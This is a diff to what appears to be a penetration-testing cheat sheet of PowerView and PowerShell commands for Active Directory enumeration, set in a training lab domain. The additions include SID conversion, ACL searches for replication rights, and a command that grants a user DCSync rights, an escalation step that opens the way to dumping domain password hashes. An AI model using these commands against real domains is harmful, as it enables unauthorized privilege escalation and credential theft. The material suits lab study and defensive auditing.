@@ -130,7 +130,9 @@ Get-ADUser -Filter 'Description -like "*built"' -Properties Description | select
 
 **Convert SID to Username**
 
-<pre class="language-powershell"><code class="lang-powershell"><strong>$SID ='S-1-5-21-1924530255-1943933946-939161726-500'
+<pre class="language-powershell"><code class="lang-powershell"><strong>convert-sidtoname
+</strong><strong>
+</strong><strong>$SID ='S-1-5-21-1924530255-1943933946-939161726-500'
 </strong>$objSID = New-Object System.Security.Principal.SecurityIdentifier($SID)
 $objUser = $objSID.Translate([System.Security.Principal.NTAccount])
 Write-Host "Resolved user name: " $objUser.Value
@@ -139,6 +141,8 @@ Write-Host "Resolved user name: " $objUser.Value
 **Convert Username to SID**
 
 ```powershell
+Convert-NameToSID
+
 $user ='TestDomainMorgan'
 $objUser = New-Object System.Security.Principal.NTAccount($user)
 $objSID = $objUser.Translate([System.Security.Principal.SecurityIdentifier])
@@ -403,7 +407,8 @@ Get-GPO -Guid ID
 
 <pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">Get-DomainObjectACL -SamAccountName [username] -ResolveGUIDS
 Get-ObjectACL -SamAccountName [username] -ResolveGUIDS
-<strong>   On the Object specified with ObjectDN, the User/Gorup specified in IdentityReference has the rights ActiveDirectoryRights.
+<strong>
+</strong><strong>Read it like that: On the Object specified with ObjectDN, the User/Gorup specified in IdentityReference has the rights ActiveDirectoryRights.
 </strong></code></pre>
 
 **Get the ACL's associated with the specified prefix to be used for search**
@@ -417,12 +422,6 @@ Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs –Verbose
 (Get-Acl 'AD:\CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access  //no GUIDs will be provided
 ```
 {% endcode %}
-
-**Set the ACL's associated with the specified path**
-
-```powershell
-Get-PathAcl -Path "\\ds-hostname\sysvol"
-```
 
 **Search for interesting ACL's (Write, modify etc.)**
 
@@ -451,7 +450,29 @@ Find-InterestingDomainAcl | Where-Object {$_.IdentityReference –eq [System.Sec
 Invoke-ACLScanner | Where-Object {$_.IdentityReferenceName –eq [System.Security.Principal.WindowsIdentity]::GetCurrent().Name}
 </code></pre>
 
-****
+**Get the ACL's associated with the specified path**
+
+```powershell
+Get-PathAcl -Path "\\ds-hostname\sysvol"
+```
+
+**Search / Add if User has DCSync Rights**
+
+{% code overflow="wrap" %}
+```powershell
+Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')}
+
+Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "studentx"}
+```
+{% endcode %}
+
+**Add DCSync Rights**
+
+{% code overflow="wrap" %}
+```powershell
+Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity studentx -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
+```
+{% endcode %}
 
 ## 🚥PowerView Domain trust
 
